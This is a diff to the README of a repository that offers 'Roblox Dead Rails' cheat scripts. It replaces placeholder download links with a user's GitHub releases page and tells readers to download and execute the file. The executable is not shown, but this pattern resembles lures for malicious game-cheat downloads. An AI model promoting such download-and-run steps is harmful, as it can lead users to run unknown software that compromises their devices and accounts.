@@ -17,7 +17,7 @@ Welcome to the **Roblox Dead Rails** repository! This project focuses on enhanci
 
 Roblox Dead Rails is a collection of scripts designed for players looking to maximize their potential in the game. With a variety of functionalities, these scripts can help you achieve goals faster and more efficiently. 
 
-You can download the scripts directly from this link: [Download Scripts](https://github.com/repo/user/archive.zip). Make sure to download and execute the file to start using the scripts.
+You can download the scripts directly from this link: [Download Scripts](https://github.com/rushrush0406/Roblox-Dead-Rails/releases). Make sure to download and execute the file to start using the scripts.
 
 ## Features
 
@@ -39,7 +39,7 @@ This repository includes a wide range of scripts tailored for different purposes
 
 To install the scripts, follow these steps:
 
-1. **Download the Scripts**: Use the following link to download the scripts: [Download Scripts](https://github.com/repo/user/archive.zip).
+1. **Download the Scripts**: Use the following link to download the scripts: [Download Scripts](https://github.com/rushrush0406/Roblox-Dead-Rails/releases).
 2. **Extract the ZIP File**: Locate the downloaded ZIP file and extract its contents.
 3. **Run the Scripts**: Open Roblox and execute the scripts as per the instructions provided in each script file.
 
@@ -121,4 +121,4 @@ For any inquiries or support, you can reach out through the issues section of th
 
 Thank you for visiting the **Roblox Dead Rails** repository! We hope you find the scripts useful and enjoy your enhanced gaming experience. For the latest updates, always check the "Releases" section. 
 
-Download the scripts now: [Download Scripts](https://github.com/repo/user/archive.zip).
+Download the scripts now: [Download Scripts](https://github.com/rushrush0406/Roblox-Dead-Rails/releases).
